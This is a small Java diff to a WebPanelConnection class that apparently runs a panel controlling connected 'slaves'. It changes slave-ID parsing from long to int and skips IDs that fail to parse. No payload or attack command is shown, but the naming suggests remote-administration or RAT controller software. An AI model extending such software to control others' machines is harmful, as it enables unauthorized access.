@@ -83,7 +83,7 @@ public class WebPanelConnection implements Runnable {
                 	int slaves = readNumber();
                 	
                 	for (int i = 0; i < slaves; i++) {
-                		long l = Long.parseLong(readLine());
+                		int l = readNumber();
                 		AbstractSlave slave = AbstractSlave.getFromId(l);
                 		slave.closeSocket(new CloseException("Closed by webpanel"));
                 	}
@@ -124,14 +124,18 @@ public class WebPanelConnection implements Runnable {
                 	boolean all = id.equals("all");
                 	
                 	if (!all) {
-                		long l = -1;
+                		int i = -1;
                 		try {
-							l = Long.parseLong(id);				
+							i = Integer.parseInt(id);				
 						} catch (Exception e) {
 
 						}
                 		
-            			AbstractSlave slave = AbstractSlave.getFromId(l);
+                		if (i == -1) {
+                			continue;
+                		}
+                		
+            			AbstractSlave slave = AbstractSlave.getFromId(i);
 
                 		if (slave != null) {
                 			slave.setSelected(b);
